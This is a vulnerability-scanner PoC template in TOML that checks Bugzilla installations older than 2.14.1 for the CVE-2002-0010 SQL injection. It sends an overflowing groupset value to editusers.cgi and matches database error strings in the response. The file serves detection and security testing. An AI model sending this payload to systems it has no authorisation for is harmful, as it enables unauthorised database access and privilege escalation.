[info]
author = "AVE"
description = "检测Bugzilla 2.14.1之前版本editusers.cgi中groupset参数SQL注入漏洞，通过构造整数溢出值绕过blessgroupset校验实现权限提升"
id = "POC-AVE-2002-0118"
name = "Bugzilla 2.14.1 editusers.cgi SQL注入漏洞 PoC"
severity = "high"
tags = ["cve-2002-0010"]
vuln_id = [
    "CVE-2002-0010",
    "AVE-2002-0118",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/editusers.cgi"
protocol = "http"

[poc.requests.body]
content = "action=edit&userid=1&groupset=-1+9223372036854775807&blessgroupset=0"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SQLError",
    "DBD::mysql::st",
    "DBD::Pg::st",
    "syntax error",
    "groupset",
]
